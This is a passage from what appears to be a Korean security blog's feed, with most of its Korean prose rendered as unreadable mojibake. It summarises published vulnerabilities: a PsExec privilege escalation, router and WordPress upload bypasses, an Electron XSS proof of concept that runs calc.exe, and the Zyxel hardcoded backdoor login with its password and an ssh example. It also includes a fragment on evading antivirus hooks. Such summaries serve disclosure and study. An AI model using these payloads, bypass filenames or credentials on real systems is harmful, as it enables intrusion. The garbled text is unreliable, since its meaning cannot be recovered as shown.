p_SysUnmapViewOfSection sysUnmap = (p_SysUnmapViewOfSection)syscallbase;</code></pre><p>ë§ˆì§€ë§‰ìœ¼ë¡œ 64ë¹„íŠ¸ ntdllì— ëŒ€í•´ NtUnmapViewOfSectionì˜ ì§ì ‘ì ì¸ system call í›„ì— í”„ë¡œì„¸ìŠ¤ì—ëŠ” ì•„ë¬´ê²ƒë„ ì—†ë‹¤. ì•ˆí‹° ë°”ì´ëŸ¬ìŠ¤ê°€ ì‹œë„í•˜ê³  hook í•˜ëŠ” user-modeì— ë‚¨ì€ ê²ƒì´ ì—†ë‹¤. ì£¼ì…ëœ DLLì´ unmap ëœì§€ëŠ” ì˜¤ë˜ëë‹¤.</p><p><img src="/2021/01/10/idioth/memfuck/image8.png"></p><p>ì—¬ê¸°ë¶€í„° Rtl* í•¨ìˆ˜ ì‚¬ìš© ì—†ì´ syscallì„ í†µí•´ ì§ì ‘ code injectionì´ë‚˜ detected codeë¥¼ ì‹¤í–‰í•˜ëŠ” ê²ƒì´ë‹¤. ì´ê²ƒì„ í•˜ë©´ì„œ WoW64ì— ê´€í•´ ë§ì€ ê²ƒì„ ë°°ì› ê³ , í•œê³„ì ê³¼ íŠ¹ì´ì , 32ë¹„íŠ¸ì™€ 64ë¹„íŠ¸ VEH ê°™ì€ ìƒˆë¡œìš´ íƒêµ¬ ì˜ì—­ì„ ì–»ì—ˆë‹¤.</p><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><p><a href="https://github.com/jackullrich/memfuck">Github ì£¼ì†Œ</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>memfuck</tag>
      
      <tag>hook</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] PsExec 0-day LPE non-official patch</title>
    <link href="/2021/01/09/fabu1ous/2021-01-09/"/>
    <url>/2021/01/09/fabu1ous/2021-01-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.0patch.com/2021/01/local-privilege-escalation-0day-in.html">LPE 0day in PsExec</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows xp ~ Windows 10</p><p>PsExec v1.72</p><p>PsExec v2.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PsExecë¥¼ ì‚¬ìš©í•˜ëŠ” ì‹œìŠ¤í…œì—ì„œ System ê¶Œí•œì„ íšë“í•  ìˆ˜ ìˆëŠ” ì „í˜•ì ì¸ named pipe hijacking <a href="https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/">ì·¨ì•½ì </a>ì´ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ì»¤ëŠ” PsExecê°€ ê¸°ì¡´ì— ì¡´ì¬í•˜ëŠ” named pipeë¥¼ ì¬ì‚¬ìš©í•  ë•Œ ê¶Œí•œ ì„¤ì •ì„ ë³€ê²½í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì ì„ ì•…ìš©í•´ Systemê¶Œí•œì„ ê°–ëŠ” named pipeë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë˜ê³  System ê¶Œí•œìœ¼ë¡œ ì„ì˜ì˜ í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>0PatchëŠ” ì´ ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ë¥¼ ê³µê°œí•˜ê³  ë¬´ë£Œë¡œ ë°°í¬í•˜ê³  ìˆìŠµë‹ˆë‹¤. PsExec ì„œë¹„ìŠ¤ëŠ” ì›ê²© requestë¥¼ ë°›ì•„ ì²˜ë¦¬í•˜ëŠ” threadë¥¼ ìƒì„±í•  ë•Œ <code>CreateNamedPipe()</code>ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. 0Patchê°€ ê³µê°œí•œ íŒ¨ì¹˜ì—ì„  <code>CreateNamedPipe()</code>ê°€ í˜¸ì¶œë˜ê¸° ì „ <code>FILE_FLAG_FIRST_PIPE_INSTANCE</code> í”Œë ˆê·¸ ê°’ì„ ì‚¬ìš©í•´ <code>CreateNamedPipe()</code>ë¥¼ í•œ ë²ˆ ë” í˜¸ì¶œí•˜ëŠ” ê²ƒìœ¼ë¡œ ë™ì¼í•œ ì´ë¦„ì˜ named pipeê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤. ë§Œì•½ ë™ì¼í•œ ì´ë¦„ì˜ named pipeê°€ ì´ë¯¸ ì¡´ì¬í•˜ë©´ Psexesvc.exeë¥¼ ì¢…ë£Œí•©ë‹ˆë‹¤.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><p><a href="https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp">https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-29669 : WIFI SD Hub Privilege Escalation Plugin</title>
    <link href="/2021/01/08/l0ch/2021-01-08/"/>
    <url>/2021/01/08/l0ch/2021-01-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/code-byter/CVE-2020-29669">https://github.com/code-byter/CVE-2020-29669</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Macally WIFISD2-2A82 Travel Router (íŒì›¨ì–´ ë²„ì „ : 2.000.010)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ë¬´ì„  ë¯¸ë””ì–´ ê³µìœ ê°€ ê°€ëŠ¥í•œ WIFI SD í—ˆë¸Œì¸ Macally WIFISD2-2A82 ì œí’ˆì—ì„œ rootë¡œ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì˜ ì„¸ë¶€ ê³µê²© ë‹¨ê³„ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>í•´ì»¤ëŠ” ì›¹ ì¸í„°í˜ì´ìŠ¤ì—ì„œ ê²ŒìŠ¤íŠ¸ ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸í•©ë‹ˆë‹¤.</li><li>íŒ¨ìŠ¤ì›Œë“œ ì¬ì„¤ì • í˜ì´ì§€ì—ì„œ adminì˜ íŒ¨ìŠ¤ì›Œë“œë¡œ ì„¤ì •í•  ê°’ì„ ì…ë ¥í•©ë‹ˆë‹¤.</li><li>BurpSuiteë¡œ í•´ë‹¹ ìš”ì²­ì—ì„œ <code>name</code> í•„ë“œê°’ì„ adminìœ¼ë¡œ ë³€ê²½í•´ ìš”ì²­í•˜ë©´ adminì˜ íŒ¨ìŠ¤ì›Œë“œê°€ ì¬ì„¤ì •ë©ë‹ˆë‹¤.</li><li>telnetì„ í†µí•´ adminê³¼ ì¬ì„¤ì •í•œ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì…ë ¥í•´ ì ‘ì†í•˜ë©´ <code>/etc/passwd</code> ì˜ rootë¥¼ í¬í•¨í•œ ëª¨ë“  ê³„ì •ì˜ íŒ¨ìŠ¤ì›Œë“œ í•´ì‹œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ol><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ íŒ¨ìŠ¤ì›Œë“œ í•´ì‹œë¥¼ í¬ë˜í‚¹í•´ root ì‰˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>router</tag>
      
      <tag>wifi sd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] SoftMaker Office TextMakerì—ì„œ ë°œê²¬ëœ ì„¸ ê°€ì§€ ì·¨ì•½ì </title>
    <link href="/2021/01/07/idioth/2021-01-07/"/>
    <url>/2021/01/07/idioth/2021-01-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/01/vuln-spotlight-softmaker-office-textmaker-jan-2021.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+feedburner/Talos+(Talos%E2%84%A2+Blog)">Vulnerability Spotlight: Multiple vulnerabilities in SoftMaker Office TextMaker</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SoftMaker Software GmbH SoftMaker Office TextMaker 2021, revision 1014</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SoftMaker Software GmbHëŠ” ì˜¤í”¼ìŠ¤ ì†Œí”„íŠ¸ì›¨ì–´ë¥¼ ê°œë°œí•˜ëŠ” ë…ì¼ ì†Œí”„íŠ¸ì›¨ì–´ íšŒì‚¬ì…ë‹ˆë‹¤. í”Œë˜ê·¸ì‹­ ì œí’ˆì¸ SoftMaker OfficeëŠ” ì›Œë“œ, ìŠ¤í”„ë ˆë“œ ì‹œíŠ¸, í”„ë ˆì  í…Œì´ì…˜, ìŠ¤í¬ë¦½íŠ¸ ë“±ë“±ì˜ ê¸°ëŠ¥ì„ ì§€ì›í•©ë‹ˆë‹¤. ì´ Office ì œí’ˆêµ°ì¸ TextMakerì˜ document parsing ê¸°ëŠ¥ì—ì„œ ì„¸ ê°€ì§€ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><strong>CVE-2020-13544: Sign-extension</strong></p><p>document parserê°€ recordë¥¼ parsing í•  ë•Œ index table recordë¥¼ 16bit unsigned ê°’ìœ¼ë¡œ ì‚¬ìš©í•˜ì§€ë§Œ ë£¨í”„ ë¬¸ì—ì„œ indexë¥¼ ë¹„êµí•  ë•Œ 16bit signed ê°’ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ index table recordì— ì§€ì •ëœ í¬ê¸°ë³´ë‹¤ ë§ì€ íšŸìˆ˜ë¥¼ ë°˜ë³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ indexë¥¼ í†µí•´ heap í• ë‹¹ ë²”ìœ„ ë°–ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><strong>CVE-2020-13545: Integer conversion</strong></p><p>document parserê°€ recordë¥¼ ìŠ¤ìº”í•˜ê³  ì½ì–´ ì˜¬ ë•Œ íŒŒì¼ ìŠ¤íŠ¸ë¦¼ì˜ í˜„ì¬ ìœ„ì¹˜ì—ì„œ recordì—ì„œ ì‚¬ìš©í•˜ëŠ” ë°”ì´íŠ¸ í¬ê¸°ë¥¼ ë‚˜íƒ€ë‚´ëŠ” 32bit integerë¥¼ ì½ì–´ì˜µë‹ˆë‹¤. ë²„í¼ë¥¼ í• ë‹¹í•  ë•Œ signed multiplicationì„ ì‚¬ìš©í•˜ì§€ë§Œ ë²„í¼ì˜ ëì„ ê³„ì‚°í•  ë•Œ unsigned multiplicationì„ ì‚¬ìš©í•˜ì—¬ heap í• ë‹¹ ë²”ìœ„ ë°–ì˜ ì£¼ì†Œì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><strong>CVE-2020-13546: Integer overflow</strong></p><p>document parserê°€ recordë¥¼ parsing í•  ë•Œ íŒŒì¼ì—ì„œ 32ë¹„íŠ¸ ê°’ì„ ì½ì–´ <code>0x23c</code>ë¥¼ ê³±í•©ë‹ˆë‹¤. í”¼ì—°ì‚°ìëŠ” ìµœëŒ€ 10ë¹„íŠ¸ì´ë¯€ë¡œ overflow ë˜ì–´ 32ë¹„íŠ¸ë¡œ ì˜ë ¤ì„œ heapì— í• ë‹¹ë©ë‹ˆë‹¤. í•˜ì§€ë§Œ ê³±ì…ˆ í•˜ê¸° ì „ì˜ ê°’ì„ ìŠ¤íƒì— ì €ì¥í•˜ê³  ì‚¬ìš©í•˜ì—¬ í• ë‹¹ëœ ë²”ìœ„ ë°–ì— ê°’ì´ ì¨ì§€ê²Œ ë©ë‹ˆë‹¤.</p><p>ì„¸ ê°€ì§€ ì·¨ì•½ì  ëª¨ë‘ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ í•´ì»¤ëŠ” íƒ€ê¹ƒì´ ë¬¸ì„œë¥¼ ì—´ë„ë¡ ìœ ë„í•´ì•¼ í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>integer overflow</tag>
      
      <tag>idioth</tag>
      
      <tag>sign extension</tag>
      
      <tag>integer conversion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-35717: RCE through XSS</title>
    <link href="/2021/01/06/fabu1ous/2021-01-06/"/>
    <url>/2021/01/06/fabu1ous/2021-01-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/bugbountywriteup/remote-code-execution-through-cross-site-scripting-in-electron-f3b891ad637">zonote RCE through XSS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>zonote &lt;= 0.4.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ë¬¸ì„œ ì‘ì„± Electron Appì¸ zonoteì—ì„œ RCE ì·¨ì•½ì ì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. zonote ë¬¸ì„œì— ë§ˆí¬ë‹¤ìš´ê³¼ htmlì„ ì‚½ì…í•´ XSS(Cross-Site-Script) ê³µê²©ì„ í•  ìˆ˜ ìˆëŠ”ë° ì•…ìš© ë²”ìœ„ë¥¼ RCEê¹Œì§€ í™•ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><blockquote><p>It is paramount that you do not enable Node.js integration in any renderer (<code>BrowserWindow</code>, <code>BrowserView</code>, or <code>&lt;webview&gt;</code>) that loads remote content.</p></blockquote><p><a href="https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">Electronì˜ ê³µì‹ë¬¸ì„œ</a>ì— ë”°ë¥´ë©´ ì›ê²© ì½˜í…ì¸ ì— ì ‘ê·¼í•˜ëŠ” ëª¨ë“  rendererëŠ” Node.js intergrationì´ ë¹„í™œì„±í™”ë˜ì–´ìˆì–´ì•¼ í•©ë‹ˆë‹¤. XSS ì·¨ì•½ì ì´ ì¡´ì¬í•´ë„ ê·¸ ì•…ìš© ë²”ìœ„ë¥¼ renderer ë‚´ë¶€ë¡œ ì œí•œí•˜ê¸° ìœ„í•´ Electron 5.0.0ë¶€í„° ê¶Œì¥í•´ì˜¨ ê¸°ë³¸ ì„¤ì •ì…ë‹ˆë‹¤. </p><ul><li>ë‹¤ìŒì€ zonoteì˜ main.jsì½”ë“œ ì¼ë¶€ì…ë‹ˆë‹¤.</li></ul><pre><code class="hljs js"><span class="hljs-keyword">const</span> browserWindowsOptions = &#123;    ...    webPreference: &#123;        nodeIntergration : <span class="hljs-literal">true</span>,        enableRemoteModule : <span class="hljs-literal">true</span>    &#125;&#125;</code></pre><p>Node.js intergrationì´ í™œì„±í™”ë˜ì–´ìˆìœ¼ë¯€ë¡œ XSSë¥¼ í†µí•œ RCE ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤.</p><ul><li>PoC</li></ul><pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onemouseover</span>=<span class="hljs-string">&quot;</span></span></span><span class="xml">try&#123;</span><span class="xml">const &#123;shell&#125; = require(&#x27;electron&#x27;);</span><span class="xml">shell.openExternal(&#x27;file:C:/Windows/System32/calc.exe&#x27;)</span><span class="xml">&#125;catch(e)&#123;</span><span class="xml">console.error(e)</span><span class="xml">&#125;&quot;&gt;</span>Hover Me<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-35489 : Unrestricted File Upload Vulnerability in WordPress Plugin</title>
    <link href="/2021/01/05/l0ch/2021-01-05/"/>
    <url>/2021/01/05/l0ch/2021-01-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.wpsec.com/contact-form-7-vulnerability/">https://blog.wpsec.com/contact-form-7-vulnerability/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Contact Form â‰¤ 7 5.3.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress í”ŒëŸ¬ê·¸ì¸ì¸ Contact Form 7ì€ í¼ë©”ì¼ í”ŒëŸ¬ê·¸ì¸ìœ¼ë¡œ í¼ë©”ì¼ ì–‘ì‹ì„ ì‰½ê²Œ ìƒì„±í•  ìˆ˜ ìˆì–´ ì¸ê¸° ìˆëŠ” í”ŒëŸ¬ê·¸ì¸ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. í•´ë‹¹ í”ŒëŸ¬ê·¸ì¸ì—ì„œ í—ˆìš©ë˜ì§€ ì•Šì€ í™•ì¥ì í•„í„°ë§ì„ ìš°íšŒí•´ ì—…ë¡œë“œí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>í•´ì»¤ëŠ” íŠ¹ìˆ˜ ë¬¸ìê°€ í¬í•¨ëœ ì´ì¤‘ í™•ì¥ì íŒŒì¼ì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ex) <code>mal.php .jpg</code> (ê³µë°±  = \t)</li><li>Contact Form 7ì€ ì—…ë¡œë“œëœ íŒŒì¼ ì´ë¦„ì—ì„œ íŠ¹ìˆ˜ ë¬¸ìë¥¼ ì œê±°í•˜ì§€ ì•Šì•„ ì²« ë²ˆì§¸ í™•ì¥ì ì´í›„ êµ¬ë¶„ ë¬¸ìë¡œ ì¸í•´ ë‘ ë²ˆì§¸ íŒŒì¼ í™•ì¥ìë¥¼ ë²„ë¦½ë‹ˆë‹¤.</li><li>ê²°ê³¼ì ìœ¼ë¡œ ì—…ë¡œë“œë˜ëŠ” íŒŒì¼ ì´ë¦„ì€ <code>mal.php</code>ê°€ ë˜ê³  ì—…ë¡œë“œì— ì„±ê³µí•©ë‹ˆë‹¤.</li><li>í•´ì»¤ëŠ” ì„ì˜ ì½”ë“œ ì‹¤í–‰ì„ í†µí•´ ì—…ë¡œë“œëœ íŒŒì¼ì— ì ‘ê·¼ ë° ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ol><p>í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ ì„œë²„ì— ì›¹ì‰˜ê³¼ ê°™ì€ íŒŒì¼ì„ ì œí•œ ì—†ì´ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/dn9uy3n/Check-WP-CVE-2020-35489">https://github.com/dn9uy3n/Check-WP-CVE-2020-35489</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>unrestricted file upload</tag>
      
      <tag>wordpress</tag>
      
      <tag>plugin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-29583: Zyxel ë°©í™”ë²½, VPN ì œí’ˆì—ì„œ ë°±ë„ì–´ ê³„ì • ë°œê²¬</title>
    <link href="/2021/01/04/idioth/2021-01-04/"/>
    <url>/2021/01/04/idioth/2021-01-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/01/secret-backdoor-account-found-in.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+TheHackersNews+(The+Hackers+News+-+Cyber+Security+Blog)">Secret Backdoor Account Found in Several Zyxel Firewall, VPN Products</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ë°©í™”ë²½<ul><li>ZLD V4.60 íŒì›¨ì–´ë¥¼ ì‚¬ìš©í•˜ëŠ” ATP, USG, USG FLEX, VPN ì‹œë¦¬ì¦ˆ</li></ul></li><li>AP ì»¨íŠ¸ë¡¤ëŸ¬<ul><li>NXC 2500, NXC5500</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Zyxelì€ í•´ì»¤ê°€ íŒì›¨ì–´ì— í•˜ë“œ ì½”ë”©ëœ undocumented account(FTPë¥¼ í†µí•œ ìë™ íŒì›¨ì–´ ì—…ë°ì´íŠ¸ ì œê³µì„ ìœ„í•œ ê³„ì •)ë¥¼ í†µí•´ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ë¡œê·¸ì¸í•˜ê³  ë„¤íŠ¸ì›Œí¬ ì¥ë¹„ë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ë¥¼ ë°œí‘œí–ˆìŠµë‹ˆë‹¤.</p><p>ì´ ì·¨ì•½ì ì€ CVE-2020-29583ìœ¼ë¡œ undocumented accountì¸ <code>zyfwp</code>ì™€ ìˆ˜ì •í•  ìˆ˜ ì—†ëŠ” ë¹„ë°€ë²ˆí˜¸ <code>PrOw! aN_fXp</code>ê°€ í‰ë¬¸ìœ¼ë¡œ ì €ì¥ë˜ì–´ ìˆìœ¼ë©° í•´ë‹¹ ê³„ì •ì„ í†µí•´ í•´ì»¤ê°€ SSH ì„œë²„ë‚˜ ì›¹ ì¸í„°í˜ì´ìŠ¤ì— ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs routeros">$ ssh zyfwp@192.168.1.252Password: Pr*******XpRouter&gt; show<span class="hljs-built_in"> users </span>current<span class="hljs-literal">No</span>: 1  Name: zyfwp  Type: admin(<span class="hljs-built_in">..</span>.)Router&gt;</code></pre><p>ì´ ì·¨ì•½ì ì„ ì•…ìš©í•´ í•´ì»¤ëŠ” ë°©í™”ë²½ì˜ ì„¤ì •ì„ ì¡°ì‘í•˜ì—¬ íŠ¹ì • íŠ¸ë˜í”½ì„ í—ˆìš©í•˜ê±°ë‚˜ ë§‰ì„ ìˆ˜ ìˆê³ , íŠ¸ë˜í”½ì„ ê°€ë¡œì±„ê±°ë‚˜ VPN ê³„ì •ì„ ìƒì„±í•˜ì—¬ ë„¤íŠ¸ì›Œí¬ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html">https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>backdoor</tag>
      
      <tag>idioth</tag>
      
      <tag>zyxel</tag>
      
      <tag>undocumented account</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Daily-Life] í¬ë¦¬ìŠ¤ë§ˆìŠ¤ CTF 2020 ìš´ì˜ í›„ê¸°</title>
    <link href="/2021/01/03/idioth/christmasctf2020-review/"/>
    <url>/2021/01/03/idioth/christmasctf2020-review/</url>
    
    <content type="html"><![CDATA[<h1 id="ì‚¬ê±´ì˜-ì „ë§"><a href="#ì‚¬ê±´ì˜-ì „ë§" class="headerlink" title="ì‚¬ê±´ì˜ ì „ë§"></a>ì‚¬ê±´ì˜ ì „ë§</h1><p>ë§¤ë…„ í¬ë¦¬ìŠ¤ë§ˆìŠ¤ì— ì´ë²¤íŠ¸ í˜•ì‹ìœ¼ë¡œ ì—´ë¦¬ëŠ” ì†”ë¡œë“¤ì„ ìœ„í•œ(?) í¬ë¦¬ìŠ¤ë§ˆìŠ¤ CTFì˜ ì£¼ìµœë¥¼ ì´ë²ˆì— ì„¸ì¢…ëŒ€í•™êµ ì •ë³´ë³´ì•ˆ ë™ì•„ë¦¬ SSGì™€ í•¨ê»˜ ë§¡ì•˜ìŠµë‹ˆë‹¤. ì‚¬ì‹¤ ìš°ë¦¬ê°€ ë¬¸ì œë¥¼ ë§Œë“¤ì–´ì•¼ ëœë‹¤ëŠ” ì´ì•¼ê¸°ë„ ê°‘ìê¸° ë“¤ì—ˆì£ . Fabu1ousëŠ” ë§¡ê²Œ ëœ ê³¼ì •ì„ ëˆˆ ì•ì—ì„œ ëª©ê²©í–ˆìœ¼ë‚˜ idiothê³¼ L0chëŠ” í†µë³´ë¥¼ ë°›ì•˜ìŠµë‹ˆë‹¤â€¦</p><blockquote><p>??? : í¬ë¦¬ìŠ¤ë§ˆìŠ¤ ë•Œ ë­í•˜ëƒ<br>idioth : ë°ì´íŠ¸ìš”<br>??? : ì—¬ì ì¹œêµ¬ ì—†ì–ì•„<br>idioth : ê·¸ë•ŒëŠ” ìˆê² ì£ <br>??? : ë¬¸ì œë‚˜ ë§Œë“¤ì–´ë¼<br>L0ch : ì „ ìˆëŠ”ë°ìš© ã…ã…<br>??? : ì•Œ ë°” ì•„ë‹ˆê³ </p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image0.png"></p><p>ë¶ˆì•ˆí•œ ì§ê°ì€ ì–¸ì œë‚˜ ì˜³ìŠµë‹ˆë‹¤. â€˜ìš°ë¦¬ ë¬¸ì œ ë§Œë“¤ì–´ì•¼ ë¼â€™ë¥¼ ë“£ìë§ˆì ì§ê°í–ˆìŠµë‹ˆë‹¤. ì•„ í¬ë¦¬ìŠ¤ë§ˆìŠ¤ CTFêµ¬ë‚˜â€¦ ì²˜ìŒì—” ì¸ë‹¹ ë‘ ë¬¸ì œì”© ë§Œë“¤ê¸°ë¡œ í–ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì—¬ê¸°ì„œ ì‚¬ê±´ì´ í•˜ë‚˜ ë²Œì–´ì§€ëŠ”ë°â€¦</p><p>ë°ì´í„° ì±Œë¦°ì§€ë¥¼ ë‚˜ê°€ê¸°ë¡œ í–ˆì—ˆëŠ”ë° íŒ€ì¥ ë…€ì„ì´ ë¶„ì•¼ë¥¼ ì°©ê°í•´ì„œ ì‹ ì²­ì„ ëª»í–ˆìŠµë‹ˆë‹¤. ê·¸ë¡œ ì¸í•´ ê° 3ë¬¸ì œë¥¼ ë§Œë“¤ê¸°ë¡œâ€¦ã…‹ã…‹ã…‹ã…‹</p><blockquote><p>idioth : ì–˜ë“¤ì•„ ìš°ë¦¬ ì„¸ ë¬¸ì œì”© ë§Œë“¤ê¸°ë¡œ í–ˆì–´ ã…ã…<br>L0ch, Fabu1ous : ???<br>idioth : ë°ì´í„° ì±Œë¦°ì§€ ì‹ ì²­ ëª»í•¨ ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹</p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image1.png"></p><p>ì²˜ìŒì— ë§Œë“¤ê¸°ë¡œ í•œ ë¬¸ì œì— ëŒ€í•œ ë²„ê·¸ í´ë˜ìŠ¤ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤ë§Œâ€¦</p><ul><li>idioth<ul><li>rev : custom packer</li><li>web : cve-2020-9484 tomcat rce</li><li>misc : snake</li></ul></li><li>L0ch<ul><li>pwn : Windows pwnable uaf</li><li>pwn : Linux pwnable type confusion</li><li>rev : obfuscate</li></ul></li><li>Fabu1ous<ul><li>pwn : angr 